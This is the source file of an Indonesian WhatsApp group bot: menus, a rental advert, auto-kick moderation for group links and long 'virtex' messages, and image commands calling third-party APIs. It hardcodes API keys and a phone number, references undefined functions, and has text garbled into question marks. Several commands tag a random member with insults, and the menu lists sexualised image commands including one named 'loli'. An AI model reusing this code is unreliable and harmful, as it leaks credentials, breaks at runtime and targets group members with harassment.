 /*NEWBASE BUATAN AIKKO GANZ
   TQ TO :
    DhaniGans (guru saia)
    rapli (partner)
    arga (tmn)*/
/*RECODE BY DEFFBOTz
   TQ TO :
   Zeeone OFC
   Ramdani Gans
   Aikko Gans
   Herman Channel
   Project Pemuda*/

const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const fs = require("fs")
const axios = require('axios')
const speed = require("performance-now")
const util = require('util')
const crypto = require('crypto')
const request = require('request')
const { exec, spawn } = require('child_process')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const ffmpeg = require('fluent-ffmpeg')
const { fetchJson, fetchText, getBase64, kyun, createExif } = require('./lib/fetcher')
const { color, bgcolor } = require('./lib/color')
const { herolist } = require('./lib/herolist.js')
const { herodetails } = require('./lib/herodetail.js')
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const setting = JSON.parse(fs.readFileSync('./setting.json'))



autoread = setting.autoread
owner = setting.OwnerNumber
botname = setting.BotName
ownername = setting.OwnerName

const fakeimage = fs.readFileSync ('./image/logo.jpg')
const thumb = fs.readFileSync ('./image/thumb.jpg')

const _antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const _antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')

        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang'
}
        if(time2 < "11:00:00"){
        var ucapanWaktu = 'Selamat Pagi'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat malam'
}


module.exports = Aikko = async (Aikko, mek, _welkom) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
    	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
		const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
		const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
		const timeMak = moment().tz('Asia/Makassar').format("HH:mm:ss");
        const timeJay = moment().tz('Asia/Jayapura').format("HH:mm:ss");
        const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[??????????????????????????????=|~!#$%^&.?/\\??^z+*@,;]/.test(cmd) ? cmd.match(/^[??????????????????????????????=|~!#$%^&.?/\\??^z+*,;]/gi) : '#'          	
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const txt = mek.message.conversation
		const botNumber = Aikko.user.jid
		const ownerNumber = [`${owner}@s.whatsapp.net`, `62858911732556@s.whatsapp.net`]
		const isGroup = from.endsWith('@g.us')
		const sender = isGroup ? mek.participant : mek.key.remoteJid
		const senderr = mek.key.fromMe ? Aikko.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
		const groupMetadata = isGroup ? await Aikko.groupMetadata(from) : ''.toString
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const conts = mek.key.fromMe ? Aikko.user.jid : Aikko.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? Aikko.user.name : conts.notify || conts.vname || conts.name || '-'    
    
		const isAntiLink = isGroup ? _antilink.includes(from) : false
		const isWelkom = isGroup ? _welkom.includes(from) : false
		const isAntiVirtex = isGroup ? _antivirtex.includes(from) : false
		const isOwner = ownerNumber.includes(sender)

			
		mess = {
		wait: 'Proses kak',
		eror: 'Maaf terjadi kesalahan !!',
		success: 'Sukses???',
		error: {
		stick: 'Itu bukan sticker kak !!',
		Iv: 'Link invalid !!'
		},
		only: {
		group: 'Fitur khusus grup !!',
		owner: 'Fitur khusus owner !!',
		admin: 'Fitur khusus admin !!',
		Badmin: 'Silakan jadikan bot admin dulu !!'
		}
		}
		const math = (teks) => {
        return Math.floor(teks)
        }
        const runtime = process.uptime()  
 
        
        const reply = (teks) => {
        Aikko.sendMessage(from, teks, text, {quoted:mek})
        }
        const sendMess = (hehe, teks) => {
        Aikko.sendMessage(hehe, teks, text)
        }
        const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        const mentions = (teks, memberr, id) => {
        (id == null || id == undefined || id == false) ? Aikko.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Aikko.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": memberr } })
        }
        const costum = (pesan, tipe, target, target2) => {
        Aikko.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
        }

		const ftrol = {
	    key : {
        participant : '0@s.whatsapp.net'
        },
        message: {
        orderMessage: {
        itemCount : 123,
        status: 1,
        surface : 1,
        message: `Hi ${pushname} ${ucapanWaktu}????`, 
        orderTitle: `${botname}`,
        thumbnail: thumb, //Gambarnye
        sellerJid: '0@s.whatsapp.net' 
        }
        }
        }
//??????????????????????????????[ group ]??????????????????????????????//
        
        const hideTag = async function(from, text){
           let anu = await Aikko.groupMetadata(from)
           let members = anu.participants
           let ane = []
           for (let i of members){
           ane.push(i.jid)
}
           Aikko.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('image/thumb.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}


//??????????????????????????????[ Button ]??????????????????????????????//

  const sendButton = async (from, context, fortext, but, mek) => {
            buttonMessages = {
                contentText: context,
                footerText: fortext,
                buttons: but,
                headerType: 1
            }
            Aikko.sendMessage(from, buttonMessages, buttonsMessage, {
                quoted: ftrol
            })
        }
        
        const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      Aikko.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
       );
       };
       
        const sendButImage = async (from, context, fortext, img, but, mek) => {
            jadinya = await Aikko.prepareMessage(from, img, image)
            buttonMessagesI = {
                imageMessage: jadinya.message.imageMessage,
                contentText: context,
                footerText: fortext,
                buttons: but,
                headerType: 4
            }
            Aikko.sendMessage(from, buttonMessagesI, buttonsMessage, {
                quoted: ftrol,
            })
        }
        async function sendButLocation(id, text1, desc1, gam1, but = [], options = {}) {
            const buttonMessages = { locationMessage: { jpegThumbnail: gam1 }, contentText: text1, footerText: desc1, buttons: but, headerType: 6 }
            return Aikko.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        }

const sendButDocument = async(id, text1, desc1, media, doc1, but = [], options = {}) => {
kma = doc1
mhan = await Aikko.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
Aikko.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await Aikko.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
Aikko.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}



if (budy.includes("https://chat.whatsapp.com/")) {
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *??? GROUP LINK DETECTOR ???*\nKamu mengirimkan link grup chat, maaf kamu di kick dari grup`)
setTimeout(() => {
Aikko.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
}, 0)
}

if (budy.length > 3500) {
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return
reply('Tandai telah dibaca\n'.repeat(300))
reply(`??? *VIRTEX DETECTOR* ???\n\nKamu mengirimkan virtex, maaf kamu di kick dari group`)
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
Aikko.groupRemove(from, [sender])
}

if (autoread){
Aikko.chatRead(from, "read")
}

colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
switch (command) {

//??????????????????????????????[ menu ]??????????????????????????????//

case 'menu':
case 'help':
gambar = fs.readFileSync('./image/logo.jpg')
menunya = 
`??????[ Info Botz ]
????????? *Name Bot* : ${botname}
????????? *Mode* : Publik
????????? *Runtime* : ${kyun(runtime)}
????????? *Baterai* : Tidak Terdeteksi
????????? *Version* : Beta
????????? *Nama Own* : ${ownername}
????????????????????????????????????>`

teks =
`*??? ${botname} ???*`
but = [
          { buttonId: `${prefix}allmenu`, buttonText: { displayText: 'SEMUA MENU ????' }, type: 1 }
        ]
        sendButLocation(from, menunya, teks, gambar, but)
break
case 'allmenu':
menu =
`Hi ${pushname} ${ucapanWaktu}????

??? INFO ???
Prefix : Multi Prefix
Mode : Public

??? Info Owner ???
Nama Owner : ${ownername}
Nomor : wa.me/${owner}

*Sertifikat Menu*
????????? *Sertifikat Menu* ???
????????? ${prefix}serti1
????????? ${prefix}serti2
????????? ${prefix}serti3
?????????????????????????????????????????????

*Ocr Menu*
????????? *Ocr Menu* ???
????????? ${prefix}namaninja
????????? ${prefix}pantun
????????? ${prefix}tongue
????????? ${prefix}ssweb
????????? ${prefix}nickepep
?????????????????????????????????????????????

*Maker And Sticker*
????????? *Sticker Menu* ???
????????? ${prefix}sticker
????????? ${prefix}ttp
????????? ${prefix}attp
?????????????????????????????????????????????

*Group Menu And Main Menu*
????????? *Group Menu* ???
????????? ${prefix}lapor
????????? ${prefix}request
????????? ${prefix}here
????????? ${prefix}setgrupname
????????? ${prefix}setdesc
????????? ${prefix}promote
????????? ${prefix}demote
????????? ${prefix}welcome
????????? ${prefix}add
????????? ${prefix}setppgrup
????????? ${prefix}kick
????????? ${prefix}antilink
????????? ${prefix}group
????????? ${prefix}wame
????????? ${prefix}notif
?????????????????????????????????????????????

*Download Menu*
????????? *Download Menu* ???
????????? ${prefix}tiktok {link tiktok}
????????? ${prefix}play {Judul Lagu}
????????? ${prefix}lirik {Judul Lagu}
????????? ${prefix}herolist {Hero}
????????? ${prefix}herodetail {nama Hero}
?????????????????????????????????????????????

*Owner Menu*
????????? *Owner Menu* ???
????????? ${prefix}addcmd
????????? ${prefix}addprem
????????? ${prefix}delprem
????????? ${prefix}premiumlist
????????? ${prefix}ban
????????? ${prefix}unban
????????? ${prefix}delcmd
????????? ${prefix}listcmd
????????? ${prefix}exif
????????? ${prefix}bc
????????? ${prefix}leaveall
????????? ${prefix}bc2
?????????????????????????????????????????????

*Kerang Menu*
????????? *Kerang Menu* ???
????????? ${prefix}apakah [query]
????????? ${prefix}kapankah [query
????????? ${prefix}bisakah [query]
?????????????????????????????????????????????

*Game Menu*
????????? *Game Menu* ???
????????? ${prefix}ganteng
????????? ${prefix}cantik
????????? ${prefix}jelek
????????? ${prefix}babi
????????? ${prefix}pinter
????????? ${prefix}kontol
????????? ${prefix}anjing
????????? ${prefix}bego
????????? ${prefix}nolep
????????? ${prefix}monyet
????????? ${prefix}beban
????????? ${prefix}baik
????????? ${prefix}jahat
????????? ${prefix}haram
????????? ${prefix}wibu
????????? ${prefix}pakboy
????????? ${prefix}pakgirl
????????? ${prefix}sadboy
????????? ${prefix}sadgirl
????????? ${prefix}hebat
?????????????????????????????????????????????

*Wibu Menu*
????????? *Wibu Menu* ???
????????? ${prefix}ppcouple
????????? ${prefix}uniform
????????? ${prefix}cuckold
????????? ${prefix}zettairyouiki
????????? ${prefix}sfwneko
????????? ${prefix}sao
????????? ${prefix}cosplay
????????? ${prefix}milf
????????? ${prefix}loli
????????? ${prefix}lovelive
????????? ${prefix}hsdxd
????????? ${prefix}husbu
????????? ${prefix}wallml
????????? ${prefix}waifu
?????????????????????????????????????????????

*Hewan Menu*
????????? *Hewan Menu* ???
????????? ${prefix}fox
????????? ${prefix}dog
????????? ${prefix}cat
????????? ${prefix}panda
????????? ${prefix}panda2
????????? ${prefix}bird
????????? ${prefix}koala
?????????????????????????????????????????????

*Image Random*
????????? *Image Menu* ???
????????? ${prefix}waifu
????????? ${prefix}wallm
????????? ${prefix}loli
????????? ${prefix}cosplay
????????? ${prefix}milf
????????? ${prefix}husbu_
?????????????????????????????????????????????

*Gtts*
????????? *GTTS Menu* ???
????????? ${prefix}tts
????????? ${prefix}kodenegara
????????? ${prefix}kodebahasa
?????????????????????????????????????????????

*TexPro Menu*
????????? *TextPro Menu* ???
????????? ${prefix}pornhub
????????? ${prefix}halloween2
????????? ${prefix}space3d
????????? ${prefix}horror
????????? ${prefix}game8bit
????????? ${prefix}ninjalogo
????????? ${prefix}tiktokmt
?????????????????????????????????????????????

*Maker Menu*
????????? *Maker Menu* ???
????????? ${prefix}blackpink {teks}
????????? ${prefix}pipe {teks}
????????? ${prefix}heloween {teks}
????????? ${prefix}heloween2 {teks}
????????? ${prefix}horor {teks}
????????? ${prefix}nulis {teks}
????????? ${prefix}sirkuit {teks}
????????? ${prefix}discovery {teks}
????????? ${prefix}fiction {teks}
????????? ${prefix}8bit {teks}
????????? ${prefix}demon {teks}
????????? ${prefix}transformer {teks
????????? ${prefix}berry {teks}
????????? ${prefix}leyered {teks}
????????? ${prefix}thunder {teks}
????????? ${prefix}magma {teks}
????????? ${prefix}stone {teks}
????????? ${prefix}neon3 {teks}
????????? ${prefix}glitch {teks}
????????? ${prefix}glitch2 {teks}
????????? ${prefix}broken {teks}
????????? ${prefix}nulis2 {teks}
????????? ${prefix}gradient {teks}
????????? ${prefix}glossy {teks}
????????? ${prefix}watercolor {teks}
????????? ${prefix}multicolor {teks}
????????? ${prefix}neondevil {teks}
????????? ${prefix}underwater {teks}
????????? ${prefix}bear {teks}
?????????????????????????????????????????????

*Logo Menu*
????????? *Logo Menu* ???
????????? ${prefix}logokaneki [query]
????????? ${prefix}logololi [query]
????????? ${prefix}logosadboy [query]
????????? ${prefix}logorem [query]
????????? ${prefix}logogura [query]
?????????????????????????????????????????????

*Sound Menu*
????????? *Sound Menu* ???
????????? ${prefix}sound1
????????? ${prefix}sound2
????????? ${prefix}sound3
????????? ${prefix}sound4
????????? ${prefix}sound5
?????????????????????????????????????????????

*Other Menu*
????????? *Other Menu* ???
????????? ${prefix}sticker
????????? ${prefix}tomp3
????????? ${prefix}tomp4
????????? ${prefix}kalkulator
????????? ${prefix}caklontong
????????? ${prefix}memegen [teks atas|teks bawah]
?????????????????????????????????????????????`
teks =
`*??? ${botname} ???*
*${tanggal}*`
Aikko.sendMessage(from, { contentText: `${menu}`, footerText: `${teks}`, buttons: [{ buttonId: `${prefix}sewabot`, buttonText: { displayText: 's?????????????????' }, type: 1 },{ buttonId: `${prefix}owner`, buttonText: { displayText: '?????????????' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: fakeimage, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
break
case 'runtime':
		    case 'test':
		            run = process.uptime() 
		            teks = `${kyun(runtime)}`
		            reply(teks)
		            break  

//??????????????????????????????[ QnA MENU ]????????????????????????????????????????????????????????????????????????????????????//
case 'kapankah':
				if (args.length < 1) return Aikko.sendMessage(from, 'Pertanyaan nya apa?', text, {quoted: mek})
				kapankah = q
					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
			sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					await (sender)
					break
case 'bisakah':
		if (args.length < 1) return Aikko.sendMessage(from, 'Pertanyaan nya apa?', text, {quoted: mek})
				bisakah = q
					const bisa =['Tentu Saja Bisa! Kamu Adalah Orang Paling beruntung','Gak Bisa','Hmm Gua Gak Tau Yaa, tanya ama bapakau','Ulangi Tod Gua Ga Paham']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					Aikko.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					await (sender)
					break
case 'apakah':
           if (args.length < 1) return Aikko.sendMessage(from, 'Pertanyaan nya apa?', text, {quoted: mek})
           apakah = q
					const apa =['Iya','Tidak','Bisa Jadi']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					Aikko.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					await (sender)
					break
case 'ganteng': case 'cantik': case 'jelek': case 'goblok':  case 'bego': case 'pinter': case 'jago': case 'nolep': case 'monyet':  case 'babi': case 'beban': case 'baik': case 'jahat': case 'anjing': case 'haram': case 'kontol': case 'pakboy': case 'pakgirl': case 'wibu': case 'hebat': case 'sadboy': case 'sadgirl':  
					if (!isGroup) return reply(mess.only.group)
               	await (sender)
 				   jds = []
				   const A1 = groupMembers
  		 		const B1 = groupMembers
 				   const C1 = A1[Math.floor(Math.random() * A1.length)]
				   D1 = `Yang *ter${command}* disini adalah @${C1.jid.split('@')[0]}`                  
				   jds.push(C1.jid)
				   mentions(D1, jds, true)
				   break
//??????????????????????????????[ other ]??????????????????????????????//
case 'sb':
case 'sewabot':
gambar = fs.readFileSync('./image/logo.jpg')
menunya = `*Hallo Kak ${pushname} mau sewa bot?*

*~ OPEN JASA SEWA BOT ~*

*?? ??? ???????? ??${ownername}??? ???????*
??????  ???  ?????????    ???    ?????????  ???   ??????


*- Harga sewa -*
??? ???????? ?????? ???? 1 minggu : 3K
??? ???????? ?????? ???? 1 Bulan : 5k
??? ???????? ?????? ???? Permanen : 15k

???????????????????????????????????? ????? ??? ????? ??? ????? ??? ????? ???

??? ???????? ?????? ???? Bot antidelay
??? ???????? ?????? ???? Bot aktif 24 jam
??? ???????? ?????? ???? Bot tidak pasaran
??? ???????? ?????? ???? Bukan wibusoft
??? ???????? ?????? ???? Bot run menggunakan Heroku

???????????????????????????????????? ????? ??? ????? ??? ????? ??? ????? ???

*- FITUR BOT -*
??? ???????? ?????? ???? Antilink grup
??? ???????? ?????? ???? Welcome image
??? ???????? ?????? ???? Antivirtex
??? ???????? ?????? ???? Kick otomatis
??? ???????? ?????? ???? Game menu
??? ???????? ?????? ???? Nulis 
??? ???????? ?????? ???? Button menu
??? ???????? ?????? ???? Asupan menu
*Dan masih banyak lagi fitur lainnya yang lebih seru????????*

???????????????????????????????????? ????? ??? ????? ??? ????? ??? ????? ???

*- PAYMENT -*
??? ???????? ?????? ???? Dana
??? ???????? ?????? ???? Gopay

???????????????????????????????????? ????? ??? ????? ??? ????? ??? ????? ???

*- Sistem sewa bot -*
????. Masukin bot ke grup
????. Transfer
????. Done

???????????????????????????????????? ????? ??? ????? ??? ????? ??? ????? ???
*OWNER*
wa.me/${owner}

???????????????????????????????????? ????? ??? ????? ??? ????? ??? ????? ???

???????????????????????????????????? ????? ??? ????? ??? ????? ??? ????? ???

???????????????????????????????????????

     *??${ownername}*
`


teks =

`${botname}

*${tanggal}*`

but = [

          { buttonId: `${prefix}menu`, buttonText: { displayText: '???????????' }, type: 1 },
          { buttonId: `${prefix}owner`, buttonText: { displayText: '?????????????' }, type: 1 }
          
        ]

        sendButImage(from, menunya, teks, gambar, but)

break
case 'rulesbot':
case 'rules':
gambar = fs.readFileSync('./image/logo.jpg')
menunya = 
`???? ???????????????????? ????????????????

????? 1. ???????????????????????? ???????????????? ????????????????
s????????s?? : ??????????/s???????? ?????????????

????? 2. ???????????????????????? ???????????????????????????? ????????????????
s????????s?? : s???????? ?????????????

????? 3. ???????????????????????? ???????????????????????????? ????????????????
s????????s?? : ????????????? ?????????????????????

????? ???????????????? ????????s???????? ???????????????????????? ???????????????????????????????? , 
???????????????????????????? ???????????????????? #???????????????? ???????????????????? ???????????????????????????? ! ! !

???? ???????????????????? ???????????????? ??????
https://wa.me/${owner}`

teks =
`*??? ${botname} ???*`
but = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: '??????????? ????' }, type: 1 }
        ]
        sendButLocation(from, menunya, teks, gambar, but)
break
case 'attp':
if (args.length == 0) return reply(`Example: ${prefix + command} Hai`)
buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
Aikko.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
//??????????????????????????????[ SETIFIKAT MENU]????????????????????????????????????????????????????????????????????????????????????//
case 'serti1':
case 'serti2':
case 'serti3':
if (args.length ==0) return reply('Text Nya Mana Tod?')
txtt = args.join (" ")
reply(mess.wait)
buff = await getBuffer(`https://sertiojanganzapi.nasihosting.com/serti/${command}/img.php?nama=${txtt}`)
Aikko.sendMessage(from, buff, image, { quoted: ftrol, caption: 'Nih Bro Hasil nya' })
break
//??????????????????????????????[ BERMAIN MENU ]????????????????????????????????????????????????????????????????????????????????????//
case 'nickepep':
anu = await fetchJson(`https://api.zeks.me/api/nickepep?apikey=zakigansha`)
reply(`*Random Nick EpEp*\n${anu.result}`)
break
case 'tongue': 
anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/tongue_twister`)
anu1 = `??? *NIHH* : ${anu.result}`
reply(anu1)
break
case 'pantun': 
anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/random_pantun`)
anu1 = `??? *PANTUN* : \n${anu.result}\n` 
reply(anu1)
break 
case 'namaninja':  
if (args.length < 1) return reply(`[???] Example :\n*${prefix}${command} Naruto*`)  
F = body.slice(11)
anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/ninja_name?name=${F}`)
anu1 = `??? *NAMA* : ${anu.your_name}\n`
anu1 += `??? *NINJA* : ${anu.result}\n`
reply(anu1)
break 
case 'ssweb':
case 'ss':
if (args.length < 1) return reply('Urlnya mana om')
teks = q
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}_*`)
buff = await getBuffer(anu.screenshot)
Aikko.sendMessage(from, buff, image, {quoted: ftrol, caption : teks})
break
//Logo Menu
case 'pornhub':
if (isBanned) return reply(mess.banned)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Deffri|Gans`)
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/pornhub?text=${m1}&text2=${m2}&apikey=Alphabot`)
Aikko.sendMessage(from, bf, image, { quoted: froxx, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'halloween2':
if (isBanned) return reply(mess.banned)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Deffri|Gans`)
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/halloween2?text=${m1}&text2=${m2}&apikey=Alphabot`)
Aikko.sendMessage(from, bf, image, { quoted: froxx, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'ninjalogo':
if (isBanned) return reply(mess.banned)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Deffri|Gans`)
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/ninja?text=${m1}&text2=${m2}&apikey=Alphabot`)
Aikko.sendMessage(from, bf, image, { quoted: froxx, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'game8bit':
if (isBanned) return reply(mess.banned)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Deffri|Gans`)
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/game8bit?text=${m1}&text2=${m2}&apikey=Alphabot`)
Aikko.sendMessage(from, bf, image, { quoted: froxx, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'horror':
if (isBanned) return reply(mess.banned)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Deffri|Gans`)
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/horror?text=${m1}&text2=${m2}&apikey=Alphabot`)
Aikko.sendMessage(from, bf, image, { quoted: froxx, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'tiktokmt':
if (isBanned) return reply(mess.banned)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Deffri|Gans`)
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/gtiktok?text=${m1}&text2=${m2}&apikey=Alphabot`)
Aikko.sendMessage(from, bf, image, { quoted: froxx, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'space3d':
if (isBanned) return reply(mess.banned)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Deffri|Gans`)
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/space3d?text=${m1}&text2=${m2}&apikey=Alphabot`)
Aikko.sendMessage(from, bf, image, { quoted: froxx, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'logokaneki':
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} DEFFBOTz`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://ziy.herokuapp.com/api/kaneki?nama=${query}&apikey=xZiyy`)
Aikko.sendMessage(from, bf, image, { quoted: ftrol, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'logololi':

